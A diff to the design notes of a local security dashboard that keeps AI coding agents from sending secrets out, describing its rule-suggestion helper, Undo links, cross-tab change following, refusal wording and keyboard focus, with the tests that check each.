+  `resolveCliBinary`'s rule, held equal by a unit test), not the hint. It
+  is an admin read (`requireAdminRead`, `read-gate.ts` `admin`), answers
+  501 where Suggest rules does, and is injectable (`assistantChannel`).
+  The words, each followed by "A summary of your rules goes with it: the
+  files, sites and models they name, never a secret's value.":
+  - `api`: "What you write here goes to Anthropic's API, so that an AI can
+    suggest rules."
+  - `api-custom`: "… goes to the AI at the address in
+    `ANTHROPIC_BASE_URL`, so that it can suggest rules." (a key and a base
+    URL other than `https://api.anthropic.com`);
+  - `claude`: "… goes through Claude Code on this computer to the AI it
+    uses (Anthropic's, unless Claude Code is set otherwise), …";
+  - `claude-custom`: "… goes through Claude Code on this computer to the
+    AI at the address in `ANTHROPIC_BASE_URL`, …" (the CLI client hands
+    the claude child that base URL);
+  - `codex`: "… goes through Codex on this computer to the AI it uses
+    (OpenAI's, unless Codex is set otherwise), …" (codex is not handed
+    the base URL).
+  - `ready: false`: the reason's sentence above, the words the 503 draws,
+    but before a press without its "again" (2026-10-31): "…, then press
+    Suggest rules." for `no-channel`, `cli-missing` and `api-key-missing`
+    (`home.js` `helperNotReady`, derived from `HELPER_REFUSALS`, so the two
+    cannot drift apart), as a note (not an alert: it is drawn on open).
+    *Suggest rules* stays on: signing in to Claude Code can fix it before
+    the press, and the 503 after a press is drawn as before, "again"
+    included. A 501, a refused read or no answer draws no line.
+
+  **The line follows each press (2026-10-31).** Until then nothing read
+  the channel again after a press: a person who signed in to Claude Code
+  and pressed *Suggest rules* (which does not focus the box) got
+  suggestions under a line that still said no helper was found, and a
+  503 drew its alert under a line that said the same sentence word for
+  word. Now the channel is read again once each press's answer is drawn
+  (rows, an empty answer or any refusal; not a cancelled press): one PATH
+  walk per press, never per poll, and only the newest read draws
+  (`whereAsked`). While the 503's helper alert stands in
+  `#describe-result`, a not-ready line is hidden (`describeWhereShown`),
+  also after a later read: one sentence, said once, under the box. A
+  ready line stays. The line comes back as it was when a new press clears
+  the alert. The box's `aria-describedby` and Suggest rules' (the alert)
+  are unchanged; a hidden line is skipped by screen readers.
+
+  The CLIs do not run the model on this computer: they send to their
+  vendor's AI, or the provider they are set to use, which is why the
+  lines say "through … to the AI it uses". "A summary of your rules" is
+  `policyExplain({audience: "assistant"})` (policy-surface.md §8.4.4):
+  the locked files and their levels, the hosts of rules, trusted and
+  untrusted sites, the hosts of questions waiting, the declared models
+  (no credentials in a URL; a key only by its variable's name) and rule
+  use counts, never a secret's value. **A change to what the helper is
+  sent (`assistantUserMessage`, the assistant audience) changes these
+  lines in the same change.** Display only: the fail-closed channel
+  choice, the suggest, apply and try routes, and what the helper is sent
+  are unchanged. Tests: `policy-assistant.test.ts` (each `via` through the
+  real selector with a stubbed PATH probe, the reasons, a planted key and
+  URL never in the answer, no client built), `home-js-describe.test.ts`,
+  and `tests/stack/dashboard-assistant.test.ts` (production wiring:
+  `no-channel`, then a fake `claude` on PATH answers `claude`, never run).
+- **A suggested send rule says when the mode leaves it nothing to decide
+  (2026-11-02).** The box's own example ("Never send anything to paste
+  sites.") makes an `op: "release"` edit, a rule for a host, and in the
+  Secrets mode such a rule decides nothing (§4.25e *A send rule says when
+  the mode leaves it nothing to decide*). Your rules said so only once the
+  rule was saved. Now, while the Rules load's `config/axes` says
+  `effective.confidentiality && !effective.integrity` (`home.js`
+  `secretsModeOnly`, which `sendRuleIdle` calls too, so the two cannot
+  drift), each suggested row whose edit is `op: "release"` (allow, block
+  or audit; `editIdle`) has a muted line after its tags and before its
+  *Try it*, in Your rules' words and class (`SEND_RULE_IDLE_WORDS`,
+  `dim rule-mode-note`): "Decides nothing in the Secrets mode: a rule for a
+  host never covers your secrets, and this mode masks only secrets." Row
+  `i` is edit `i` of the answer (`policy-assistant.ts`, `rows:
+  edits.map(…)`); if their counts ever differ, no row gets the line rather
+  than a wrong one. The card is drawn as before in any other mode or with
+  the axes unread, for every other kind of row, and in its head, Apply,
+  Discard and its Undo (which draws the line again), the typed ALLOW, *This
+  would let* and the helper's note. **Try it is unchanged:** its probe is a
+  non-secret masked value from a web page (`tryProbe`, the arbiter's Test
+  a flow), which the rule does decide for, so beside the line it can still
+  answer "After: … is blocked" about a value this mode never makes;
+  changing that means changing the arbiter's tester or hiding the button,
+  and is not part of this change. What the helper is sent and offers is unchanged.
+  Presentation only. Tests: `home-js-describe.test.ts` (the Secrets mode,
+  full, unread and off; Try it and Apply unchanged; Discard and Undo; rows
+  and edits of different counts) and
+  `tests/stack/describe-send-rule-mode.test.ts` (the served card over the
+  real arbiter shows the line, Your rules shows the same line after Apply,
+  and the gate decides the key's send to that host by `egress:secret-*`,
+  never `egress:user-rule-block`).
+- **Models are read-only here** (policy-surface.md §8.4.3a): an
   answer or Apply carrying a model op is a 422, and Settings › Models
   (§4.25l) is the only model editor.
 - Tests: `home-js-describe.test.ts`; `policy-assistant.test.ts`;
   `tests/stack/dashboard-assistant.test.ts` (production wiring, models refused
-  on both paths). The keyboard focus: below.
+  on both paths); `tests/stack/describe-focus.test.ts` D0 (Ctrl+Enter posts
+  the box's text unchanged). The keyboard focus: below.
 
 **Describe what you want keeps the focus (2026-10-14).** *Suggest rules*,
 *Try it* and *Apply* go off while they ask the server, *Cancel* hides
@@ -6766,11 +8971,17 @@ preview keeps the focus*):
   status line says "Cancelled."
 - **Cancel and Discard.** *Cancel* hidden with the focus on it, whether
   pressed or put away by the answer, gives the focus to *Suggest rules*.
-  *Discard* does the same, its card gone.
+  *Discard* gave it to *Suggest rules* too, its card gone, until
+  2026-10-28; now it leaves a line with Undo in the card's place, and the
+  focus goes to that Undo; Undo pressed gives it to the first line of the
+  suggestion drawn again, *Suggested rules* (§4.25n *Describe can undo
+  its Discard*).
 - **Try it** has the focus back once its answer is drawn (`focusBack`).
   The answer describes it: *Now: … After: …*, or the refusal's words.
 - **Apply.** Applied, the card is gone, and the line "Applied. Your rules
-  are updated, …" takes the focus. Refused (a 409 when the rules changed,
+  are updated." (`.describe-done`) takes the focus. Its *Undo*, pressed,
+  goes off; the line then says "Undone." or the refusal and takes the
+  focus back from the page, still in the card. Refused (a 409 when the rules changed,
   a stopped service), *Apply* has it back, described by the refusal. On a
   409, *Describe it again* follows it in Tab order.
 - **Nothing is taken.** The focus moves only from where the press left it,
@@ -6789,7 +9000,11 @@ repeat would cancel the request).
 
 **Not covered:** a typed ALLOW changed while *Apply* is out leaves *Apply*
 off after a refusal. The focus is then in the ALLOW box, where the person
-put it, so nothing falls.
+put it, so nothing falls. Until 2026-10-25 typing there while *Apply* was
+out turned *Apply* back on, and Enter sent it again. Now the card is busy
+while its Apply is out (`applySuggestion` `APPLYING`, `confirmBox`'s
+`busy`): *Apply* stays off whatever is typed, and a second press sends
+nothing.
 
 Tests: jsdom `home-js-describe-focus.test.ts` (`press` drops the focus of
 a button turned off, as Chromium does, while it still has it). It covers
@@ -6807,9 +9022,73 @@ walks Suggest rules, Try it (the arbiter's own probe), ALLOW and Apply
 again, with the focus at each step. Its oracle: the `.env` value reaches
 neither the helper, a drawn page nor an answer.
 
-**The last scan's card.** Under the first-run and warning cards, Home shows
-what the last `mandu scan` found had already left the computer before
-Mandu, or how to run one, and links the Scan page (§4.25ai).
+**Every change made on Rules ends with an Undo or a link (2026-10-25).**
+Removing or flipping a rule, a Save of file choices, one saved suggestion
+and a Settings card's change each end with a notice that has *Undo*
+(`rulesNotice`, `noticeUndo`, `POST /api/policy/changes/<id>/undo`).
+Until 2026-10-25 the changes that can touch the most rules at once had
+neither an Undo nor a link: Describe's *Apply* said "you can undo this
+under Rule changes in Approvals" in plain words, and the route's
+`changeId` was dropped; a Save of several suggestions said "Each is its
+own change in Approvals, under Rule changes" with no link; and a Save of
+file choices that also saved suggestions dropped the file changes' Undo.
+Now (`home.js` `applySuggestion` / `undoApplied`, `saveSuggestions`,
+`saveFileChanges`, `changesLink`):
+
+- **Describe › Apply.** The line reads "Applied. Your rules are updated."
+  with *Undo* (named "Undo the change in Describe what you want",
+  described by the line) and **See it in Approvals**, a link to
+  `/approvals/<pc-…>` that opens Approvals at that change's *Rule changes*
+  row, marked, with its own Undo (`markApprovalsAsk`). *Undo* is the same
+  undo as that row's. It is off until Your rules and Rule changes are read
+  again after the Apply, so a press cannot land while those reads are out.
+  Pressed, it goes off while it posts; the line then says "Undone." and
+  Your rules is read again, or it says the refusal's words. An answer with
+  no `pc-…` id (an older server) keeps the sentence of before, with
+  neither.
+- **Several suggestions saved.** The notice keeps its words, and "in
+  Approvals, under Rule changes" is a link to the newest of the applied
+  changes (the route applies them in order); the others sit beside it.
+- **File choices and suggestions in one Save.** "4 changes saved, and 2
+  suggestions, each its own change in Approvals, under Rule changes.", with
+  the same link, keeps the Undo of the file changes, its words naming that
+  part: "Undo the 4 changes".
+
+No route changed, nor what Undo does. Tests: jsdom
+`home-js-describe-focus.test.ts` (Undo and the link at `pc-000042`, Undo
+off until the reads return, Undo posted then "Undone.", a refused Undo, no
+change id, ALLOW typed while Apply is out) and `home-js-suggested.test.ts`
+(three saved link the newest; a mixed Save's named Undo and link). Stack
+`tests/stack/describe-focus.test.ts` D3 presses the line's Undo
+(policy.yaml and Your rules back as before) and D6 follows See it in
+Approvals to the marked row.
+
+**… and on Settings (2026-10-26).** A change saved in Settings › Models,
+Sensitivity labels or Prompt filters is recorded under Rule changes with
+its own Undo, but until 2026-10-26 its notice had only the card's Undo,
+gone once the notice was drawn again, and never said where the change
+could be found later. Now each of the three notices (`home.js`
+`modelsNotice`, `labelsNotice`, `promptNotice`) ends, after its words
+(the restart sentence among them on Models) and its Undo, with **See it
+in Approvals** (`noticeChangeLink`, over `changesLink`): the link opens
+Approvals at that change's *Rule changes* row, marked, with that row's
+Undo, as Describe's line does. Tab goes words, Undo, link. Three notices
+can be open at once, so each link is named by its card, its own words
+first, as each Undo is: "See it in Approvals: the change in Models"
+(… "in Sensitivity labels", … "in Prompt filters"), described by the
+notice's words. An answer with no `pc-…`/`pp-…` id draws no link, nor
+does "Undone." or a refusal. Nothing else changed: the words, the Undo,
+the focus rules (`settingsPlace` / `settingsRefocus`), and no route.
+Tests: jsdom `home-js-notice-undo.test.ts` (each card's link at
+`pc-000007`, after its Undo, its name and description; none for no id or
+another shape; none after "Undone." or a refused Undo) and stack
+`tests/stack/notice-undo-names.test.ts` U5 (a model added, its link
+followed to the marked Rule changes row, which has its Undo).
+
+**The last scan's card.** Under *Approvals waiting*, itself under the
+first-run and warning cards, Home shows what the last `mandu scan` found had
+already left the computer before Mandu, or how to run one, and links the
+Scan page (§4.25ai).
 
 **First-run card.** Until the first live session is recorded, Home shows a
 setup card between the hero and *Approvals waiting*. It is driven by the
@@ -6847,7 +9126,8 @@ empty and fallback states, so they follow the rest of the page:
 
 - A command inside a sentence the page writes is `code`, as on the first-run
   card. That covers Home › Running now with no agent (`mandu claude`,
-  `mandu codex`); Where your data lives, both when its list fails and in its
+  `mandu codex`, or the agents you use, §4.25 *The command names the agent
+  you use*); Where your data lives, both when its list fails and in its
   "open to others" note (`mandu paths`); and Settings › Protection service
   on a dashboard started without the service controls (`mandu dashboard`).
   The words are unchanged. A sentence the server writes stays plain text,
@@ -6916,6 +9196,51 @@ empty and fallback states, so they follow the rest of the page:
       `product-empty-states`, stack `settings-prompt-signed-out` (a real
       arbiter and dashboard, the served page signed out and then signed
       in, and the oracle).
+  - **Rule changes says when it could not be read (2026-10-29).** Until
+    then a poll read of `GET /api/policy/changes` that failed (the service
+    stopped or restarting, the dashboard gone) set `S.changes.last` to
+    null and kept no cause, and `drawRuleHistory` hid the whole section,
+    rows you were reading and its section link with it: the page read as
+    if no rule had ever changed. *Answered earlier*, just above, said
+    "Could not check your earlier answers." in the same state, and a link
+    to a rule change (`/approvals/pc-…`, from a rule's origin line or a
+    Settings notice) said "That rule change is not among the changes
+    listed." under a list that was not drawn. Now (home.js
+    `loadRuleHistory`, `drawRuleHistory`, `ruleChangeGone`):
+    - A failed poll read keeps its cause in `S.changes.failure`, as a
+      failed *Show more* does (`changesFailure`: `'gone'`, `'down'` or the
+      status). The section stays, with one line in place of its rows:
+      "Could not read your rule changes." and the cause in `cannotCheck`'s
+      words, without the Settings link (for example "The protection
+      service is not running."). Its section link stays; the search box,
+      with nothing read to search, is hidden.
+    - The rows of the read before are not left with live *Undo* buttons:
+      the line replaces them. The next read that works draws them again;
+      `ruleHistoryKey` holds `failure`, so the failure and the recovery
+      each redraw.
+    - A link to a rule change whose read failed says "Rule changes could
+      not be read just now, so this change cannot be shown. It is still
+      kept; try again in a moment." After a read that works, the note
+      follows that read as before.
+    - A dashboard whose service offers no rule changes at all (the route's
+      `501`) keeps the section hidden: there is nothing to fail to read.
+      A failed *Show more* keeps its rows and says why beside the button,
+      and a search whose read failed keeps its "Could not read your rule
+      changes." with *Clear*, and the cause in `cannotCheck`'s words
+      (2026-10-31).
+    - No service behind the route (its `404 {"error":"arbiter not
+      connected"}`) is a cause of its own, `'not-connected'`, said as
+      ownRefusal says that answer: "The protection service is not
+      connected.", never "error (404). Refresh in a moment." (2026-10-31;
+      while Mandu is not running at all, *Protection is off when nothing
+      runs* says that instead).
+    - Presentation only. Tests: `home-js-rule-changes-unread.test.ts`
+      (jsdom: rows, then no answer, then rows again; the service not
+      running; the link's note before and after a read; the 501; the 404),
+      component `approval-loop` (an arbiter with no rule-change op draws
+      the line), and `tests/stack/rule-change-link.test.ts` L4 (a real
+      arbiter stopped by its own close: the change's address draws the
+      line and the note, no row, no *Undo*, and no secret value).
 
 - *A could-not line names the cause the page knows (2026-10-10).* Home's
   hero said each failure in words (*The hero says why in words*, item 1),
@@ -7375,10 +9700,9 @@ in the hero and on the agent page: `ownWords` takes a `{ to, text }` part
 that `words()` draws with `placeLink`. On Settings itself the link brings
 the page back to its top. Left as the server writes it: a refusal without
 the dial ("The protection service did not answer.", "… did not answer;
-nothing was changed"), which can also be a slow service, and the
-admin-channel 503 of a supervised arbiter that stopped ("admin channel
-unavailable: … (adopted instance) …", `arbiter-adapter.ts`), server text
-for a later change. Presentation only: no route, status or server string
+nothing was changed"), which can also be a slow service. (The admin-channel
+503 that was left here too is worded since 2026-10-25, *An answer this
+dashboard cannot pass on*, below.) Presentation only: no route, status or server string
 changed. Tests: `home-js-refusals.test.ts` (each form of the dial, the link
 and where it goes, the look-alikes kept), and
 `tests/stack/product-service-down-refusals` (a real arbiter, net-proxy and
@@ -7389,6 +9713,52 @@ path shows). The stack fixture supplies Describe's configured-model
 prerequisite through `assistantModel`, so this refusal proof needs no host
 agent CLI or API key. It also asserts that the stopped arbiter prevents any
 model completion call.
+
+*An answer this dashboard cannot pass on (2026-10-25).* A dashboard that
+found the protection service already running adopts it (§4.8 *Adopted
+services*; the shared stack's service outlives a dashboard restart by
+design) and holds no admin channel (`server-main.ts adminTarget`), so every
+answer and change the page sends is refused before anything runs, with a
+503 in the server's words: the adapter's "admin channel unavailable: this
+dashboard did not start the arbiter (adopted instance) … restart the services
+from Settings …" (`arbiter-adapter.ts`, the prefix `http-util.ts
+ADMIN_UNAVAILABLE_PREFIX`), bare (an answer, a rule change, a model), in the
+brackets of the label route ("the protection service did not answer (…)"),
+after the secrets route's "arbiter: " or a prompt-filter route's "<op>
+failed: ", or the arbiter's own refusal of the op on its data socket
+("admin-only: '<op>' … on the admin channel (the inherited fd …)",
+`arbiter/ipc/server.ts adminOnlyError`). The page showed that text as
+written, and its remedy named a Restart that Settings deliberately does not
+offer for an adopted service. Now `ownRefusal` reads every form as one
+refusal (`ADMIN_CHANNEL_REFUSAL`, the two prefixes at the start, after a
+space or after "(") and says, on every surface that shows a refusal (a card's
+answer, a rule change's Allow and Not now, Rules' Save, Not a secret,
+Describe's Apply, a Settings model or label, the session page's Needs your
+OK): "This dashboard cannot pass on your answers: the protection service was
+already running when the dashboard started. Nothing was changed. To fix it,
+run `mandu stop` when no agent is running with mandu, then start your agent
+again." (`ADMIN_CHANNEL_WORDS`, the command as code). "Nothing was changed" is
+true: the admin op never ran. The remedy was checked on both install shapes:
+`mandu stop` SIGTERMs every resident dashboard and arbiter
+(`launcher/src/subcommands.ts runStop`). With no service unit, the next launch autostarts a
+dashboard that spawns, and so owns, its arbiter (runtime-instances.md §10).
+Under a systemd user service (`mandu serve`, or a hand-written unit with
+`Restart=always`, runtime-instances.md §4.1d), the unit brings the dashboard
+back, it finds no arbiter, and it starts its own (a launch in that gap waits,
+§4.1c). "When no agent is running" because a stop blocks running agents until
+the service is back (`RESTART_CONFIRM`). A look-alike stays as written:
+another 503 ("Restart the services from Settings …" from elsewhere, a
+model's TCP refusal), the phrase inside a sentence of its own, a 409. Settings
+› Protection says the same on the adopted row (`ADOPTED_SENTENCE`, below).
+Presentation only: the routes, the 503, the admin channel and the
+supervisor's refusal are unchanged. Tests: `home-js-refusals.test.ts` (the
+four forms from the real route handlers, `mandu stop` as code, no developer
+word, the label card, the look-alikes), `view-model/service-summary.test.ts`
+and `home-js-settings.test.ts` (the adopted row's parts), and
+`tests/stack/product-adopted-refusals` (a real arbiter and the production
+adapter with no admin channel, then with the data socket as its admin target;
+Allow once on the served page says the sentence, the question is still
+pending, and no page or route answer carries the secret's value).
 
 *A connection cut on its way (2026-10-11).* A request already sent when
 the service stops gets no failed dial: the arbiter client rejects it with
@@ -7764,7 +10134,8 @@ agent page is read when it opens, by every Home poll while it is open, and
 after an answer to one of its questions. *Your rules* on Rules is read when
 the page opens and after each change made there. Settings' *Models*,
 *Sensitivity labels* and *Prompt filters* cards are each read when Settings
-opens and after each change made in them. A change turns off only its own
+opens, after each change made in them, and when they changed elsewhere
+(*Settings follows a change made elsewhere too*, below). A change turns off only its own
 row while it is on its way, so a second change can start before the first
 one's read answers. Until 2026-10-12 the answer that came last drew, even
 when its read was asked first. On a slow network or a busy protection
@@ -7796,8 +10167,9 @@ by its list's read (the agent page's by the Home read after the answer), so
 a list is never left undrawn. Reads answered in the order they were asked
 are each taken, as before.
 
-*Not covered:* an answer given on Home or Approvals does not mark Rules'
-reads; Rules reads its rules again when it opens. The protection switch has
+An answer given on Home or Approvals does not mark Rules' reads: an open
+Rules page follows it on the next poll instead (*Rules follows a change
+made elsewhere*, below). The protection switch has
 its own guard, shared by two readers (*The protection switch keeps what you
 saved*, below).
 
@@ -7828,11 +10200,142 @@ a relay that holds one answer (`tests/lib/holding-relay.ts`):
   it again, and the server lists neither;
 - the oracle holds.
 
+**Rules follows a change made elsewhere (2026-10-28).** Rules read your
+rules when it opened and after its own changes, never on a poll. A rule
+changed somewhere else did not show until you left the page or reloaded:
+a file your agent made "No AI" through its policy tools (applied at once,
+since it only adds protection), an *Always allow* or *Block* given on Home,
+in Approvals or from a notification in another tab, an edit to policy.yaml,
+or *Apply* under *Describe what you want* in a second tab. Saves were never
+at risk (the 409 `stale` refusal below), but the page showed a file as
+unprotected after the agent protected it.
+
+Now `/api/home` carries `rulesVersion` (view-model/home.ts
+`rulesVersionOf`), an opaque digest (32 hex digits) of two things. The
+first is the in-force document's `lawHash`, from the `policyDocument` read
+Home already makes on each poll, so no read is added. The second is the
+answers kept in Rules: each standing answer's id, status and the moment it
+was given. Waiting questions, *Allow once* and counts of uses are left out.
+It holds no path and no rule's words. It is absent when the document's
+version cannot be read (no reader, a failed read, an older arbiter) or the
+answers were not read: an answer that cannot be compared is not a change.
+
+The page keeps the version its rules are at (`RULES_SEEN`). A read the page
+asks itself (Rules opened, a change made on it) forgets that version. The
+first poll asked after that read gives the version, with no read and no
+line, so the page's own change never reads as one made elsewhere. On each
+Home poll while Rules is shown and the tab visible, a different version
+starts the follow (home.js `followRules`): your rules are read again, and so
+is the open folder, as the stale-save path reads them. The place and the
+focus are kept as the poll keeps them (`pollPlace` / `pollRefocus`), and an
+opened row stays open while it is listed. A polite status line under the
+Your rules heading (`#rules-changed`) then says "Your rules changed since
+this page was read. It shows them now.". It links "See the change in
+Approvals" to the newest rule change (`policy/changes?limit=1`, read only on
+a follow) when that change has a change id and was made after the drawn
+read was asked. A changed answer has no change of its own, so the newest
+change is then older and the line has no link. The page's next read of its
+own takes the line away.
+
+- **Choices waiting to save keep their versions.** The follow does not call
+  `pendingVersionsNow`, as the stale-save path does after a refused Save.
+  `syncFromOtherTab` makes the same choice. A choice made before your
+  agent's tightening still names the rule as it was when you chose. Its
+  Save is still refused with 409 `stale`, and only then moves onto the new
+  versions. The follow changes the display only, never the save guard.
+  Changes to save and its count stay as they were.
+- **Not while you type.** With the focus in a text field on Rules (*Find a
+  rule*, a host box, the reason box, Describe), nothing is read. The first
+  poll after the focus leaves reads.
+- Nothing is read or drawn while the version holds, and a server with no
+  `rulesVersion` keeps the old behaviour.
+- **The questions waiting read it too (2026-11-03, queue item #284).** The
+  version leaves them out, so a file row's "Waiting for your answer" line
+  follows them on its own (`followFileWaiting`, §4.25n *And the sends of
+  it that wait*): a change of the waiting ids reads your rules again at the
+  version already followed, with no line and no change to the save guard.
+
+*Not covered:* a change within one poll after a read of the page's own is
+taken as that read's (the next change shows). Neither the labels in the
+page's older store (those made before labels moved to policy.yaml) nor the
+administrator's layer are part of the version, so a change to either made
+elsewhere shows when Rules opens again. Tests: unit
+`home-js-rules-follow.test.ts` (jsdom) and `home-rules-version.test.ts`
+(server); stack `tests/stack/rules-follow-change.test.ts`. The stack test
+uses a real arbiter (`secrets`) with a policy.yaml and a registered `.env`,
+the production adapter and a real dashboard, and opens the served Rules
+page. The agent's tightening over the data socket shows within one poll,
+with the line and its link, and with no navigation. An *Always allow* over
+the approvals route then shows its row. No body read and nothing in the DOM
+holds the key's value, and the DOM holds no token.
+
+**Settings follows a change made elsewhere too (2026-11-04, queue item
+#238).** Settings read its *Models*, *Sensitivity labels* and *Prompt
+filters* cards when it opened and after its own changes. A model added in
+a second tab, a label given a level there or by hand in policy.yaml, or a
+prompt-filter exception added elsewhere stayed missing until a reload: a
+removed model kept its Edit and Test connection, and the person learned of
+the change only from a refused Save (409 `stale`, §4.25l and §4.25s). All
+three cards are sections of policy.yaml, so a change to any of them moves
+`lawHash` and with it `rulesVersion`. While Settings is shown and the tab
+visible, a Home poll whose version differs from the one a card drew reads
+that card again (home.js `followSettings`), keeping the place and the focus
+as the poll does.
+
+- **Per card.** Each card keeps its own version (`SETTINGS_SEEN`), forgotten
+  by a read the page asks itself (Settings opened, a change made in the
+  card, its Undo, a read after a failure). The first poll asked after that
+  read gives the version silently, as on Rules. A label saved here does not
+  hide a model changed elsewhere meanwhile: Models still follows.
+- **Only a card that changed says so.** The version also moves on an answer
+  given in Approvals, which Settings does not show. A follow read compares a
+  digest of what the card draws with what it drew: for Models only the
+  list, your administrator's part (`modelsAdmin`) and the networks
+  (`perimeter`), never the rest of `policy/panel`, whose approvals queue an
+  answer changes; for Sensitivity labels and Prompt filters, their own view
+  model. A card with the same content draws nothing and says nothing.
+- **Its own line, not the notice.** A card that changed says "Your models
+  changed since this page was read. It shows them now." (and "Your
+  sensitivity labels …", "Your prompt filters …") on a polite status line
+  above its notice (`#models-changed`, `#labels-changed`,
+  `#prompt-changed`). The notice keeps the page's own last change, with its
+  Undo and its link. The card's next read of the page's own takes the line
+  away.
+- **Never under your hands.** A card is skipped, and the first poll after it
+  settles reads it, while the focus is in the card, while one of its changes
+  is on its way (a row's buttons off, an Undo out), or while one of its
+  questions is open. Also, for Models, while the model form is open; for
+  Sensitivity labels, while a level picker shows a level other than the one
+  drawn (the "Not saved" state) or a label with no level has a name typed;
+  for Prompt filters, while an exception is being written or a menu choice
+  waits for Enter (`promptUnderHands`). A follow read keeps the kind chosen
+  in the exception form while it is still offered.
+- **A follow read that fails** draws nothing and keeps the version before
+  it, so a later poll follows again. A card that could not be read is left
+  to the read after a failure (`readAgainUnread`).
+- The 409 `stale` refusals stay as they are; no route and no save path
+  changed. Settings › Protection reads config.toml, not policy.yaml, and is
+  not part of this.
+
+Tests: unit `home-js-settings-follow.test.ts` (jsdom: the same version reads
+nothing; a new one reads each card once and only the changed one draws and
+says so; an approvals answer alone says nothing on Models; a picker changed,
+the form open, the focus in the exception box each keep their card until it
+settles; the page's own save is taken silently and its Undo stays; a hidden
+tab and a server with no `rulesVersion` read nothing; a failed follow read
+follows again); stack `tests/stack/settings-follow-change.test.ts` (a real
+arbiter at `secrets` with a policy.yaml and a registered key, the
+production adapter and a real dashboard, the served Settings page: a label
+mapped and a model added in another window each show within one poll with
+their line, with no navigation; no body read and nothing in the DOM holds
+the key's value, and the DOM holds no token).
+
 **The protection switch keeps what you saved (2026-10-12).** The switch in
 Settings › Protection, its name and its sentence show the setting saved in
 config.toml (`GET /api/config/axes`, *The on/off says what runs*). Settings
 reads it each time it opens, Rules reads it with its rules for the line
-above them, and a flip draws the answer to its POST. Until 2026-10-12 the
+above them, a flip draws the answer to its POST, and Home's poll reads it
+again when it changed elsewhere (below). Until 2026-10-12 the
 answer that came last drew, even when its read was asked first. On a slow
 network or a busy dashboard:
 
@@ -7875,6 +10378,53 @@ it through a relay that holds one answer (`tests/lib/holding-relay.ts`):
 - the same the other way, for on;
 - the oracle holds.
 
+**Settings follows an on/off saved elsewhere (2026-10-30, nightly #237).**
+The setting can change outside the open page: the switch in a second tab,
+`mandu mode` in a terminal, an edit of config.toml. The page read it only
+when Settings opened, so the card kept the old setting while the top bar
+in the same window, which reads Home's `protection.configured` on every
+poll, showed the new one ("Protection on · off from the next start" over a
+switch that read On). After the restart it said "Still off until the
+protection service restarts" for a setting saved off, and a press opened
+the typed-OFF box for it. Now `followSaved` (home.js) runs on each Home
+poll while Settings or Rules is shown in a visible tab. When the poll's
+`configured`, on the secrets axis (`secrets`/`full` on, `off`/`injection`
+off; the frozen integrity axis has no switch), differs from the on/off the
+page drew, it reads `config/axes` again through `AXES_READS`. Then:
+
+- one read per change, not one per poll. The value that made it read is
+  kept (`S.axesFollowed`), and a poll with that value reads nothing more,
+  so a `configured` that keeps disagreeing with the read (an older server)
+  reads once. The page's own read (Settings opened, Rules' read) and its
+  own flip forget it, so the same value saved elsewhere after them is read
+  again;
+- never under the person's hands: no read while a flip is out
+  (`S.protectOut`) or while the focus is in the OFF box. The first poll
+  after either reads. A box left open is closed when the read finds saved
+  off, as `renderProtection` closes it;
+- the read is ordered with the others: asked before this tab's flip, or
+  before a newer read taken, it is dropped. A read that fails keeps what
+  was drawn and is not taken. One that finds the on/off already drawn
+  draws nothing, so a refusal in the note stays;
+- one that finds another on/off draws the switch, its name, dot and
+  sentence and the Rules line, and says why the switch moved in its own
+  `role=status` line in the card (`#settings-protect-changed`, not the note
+  a redraw rewrites): "Changed outside this page: saved as off." (or on).
+  The page cannot know who changed it, so it names no one. The line goes
+  at the page's next own read or flip.
+
+Presentation only: the route, its CSRF gate, the typed OFF and what a flip
+posts are unchanged, and the follow never posts. Tests:
+`home-js-settings.test.ts` ("follow:": one read and the line, no read for
+an equal value or a lasting disagreement, none under the OFF box or a
+flip, the page's flip forgetting the last follow, the restart case, the
+Rules line), `home-js-reads-order.test.ts` (a follow read answered after
+this tab's flips is dropped) and `tests/stack/protection-switch-follows.test.ts`
+(a real arbiter at `secrets` and a real dashboard: a second served page
+turns it off with the typed OFF, then the launcher's `writeModeToConfig`
+turns it on, and the first page follows each within one poll, its switch
+agreeing with the top bar).
+
 **The switch holds while its change is on its way (2026-10-13).** Until
 2026-10-13 the switch stayed live while its `POST /api/config/axes` was
 out, with the press it had (`flipProtection(!on)`) until the answer drew
@@ -7887,10 +10437,14 @@ while its request was out (`S.serviceOut`).
 
 Now a flip holds the switch from its POST (after the typed OFF, when one is
 asked) until its answer, whatever it is (`S.protectOut`, home.js
-`flipProtection`):
+`flipProtection`, `sendProtection`):
 
 - **A press while held does nothing.** It asks no question and posts
-  nothing.
+  nothing. Since 2026-10-25 the OFF is typed in a box in the row (*Turning
+  protection off asks on the page*, below): while held, its Turn off and
+  Cancel are off too, Enter and Escape in it do nothing, and the focus, if
+  it was in the box, goes to the held switch. The answer closes the box,
+  so the next press asks again.
 - **The switch stays focusable.** It is held with `aria-disabled="true"`,
   dimmed as a disabled switch (app.css), not `disabled`, which would drop
   the focus to `<body>`. A screen reader reads it as unavailable, and the
@@ -7902,8 +10456,8 @@ asked) until its answer, whatever it is (`S.protectOut`, home.js
 - **The hold always ends.** Every request answers (`answerOf`: status 0
   with no answer), and the hold ends in a `finally`. A refusal or no answer
   leaves the switch live and says why in the note, as before, so the next
-  press is a change of its own. A press not confirmed with OFF holds
-  nothing.
+  press is a change of its own. A press not confirmed with OFF (the box
+  open, or closed with Cancel) holds nothing.
 
 *Not covered:* the row says nothing while the change is on its way; the
 dimmed switch is the only sign (the dashboard writes config.toml and
@@ -7913,9 +10467,10 @@ Presentation only: what is posted, the typed-OFF question, the frozen axis
 and the `config/axes` gate are unchanged. Tests:
 
 - `home-js-settings.test.ts` (jsdom, a POST held by the stub):
-  - turning it off, then two more presses and a press after Home's poll
-    redrew the row: one question and one POST, the focus on the switch, the
-    switch live again on the answer, and the next press posts;
+  - turning it off, then two more presses, Enter and Escape in the box and
+    a press after Home's poll redrew the row: one question and one POST,
+    the focus on the switch, the switch live again on the answer, and the
+    next press posts;
   - turning it on with a double press posts once;
   - a refusal and no answer each end the hold;
   - a press not confirmed with OFF holds nothing;
@@ -7969,6 +10524,26 @@ there too, so the first Tab scrolled back up.
 - **No ring.** These targets are not controls. The heading has no outline,
   and a marked card or step keeps its accent mark instead, as a step opened
   from a time does (§4.25b). preventScroll keeps each page's own scroll.
+- **Skip to the page (2026-10-28).** On a first load the focus is at the
+  top of the document, and the first Tabs walked the brand, the seven page
+  links and the status link before the page: up to ten presses to the first
+  Approve, on every reload. The first element of `<body>` is now a link,
+  *Skip to the page*, so it is the first Tab stop on every page (WCAG 2.4.1
+  *Bypass Blocks*). It is clipped like `.sr-only` until it has the focus,
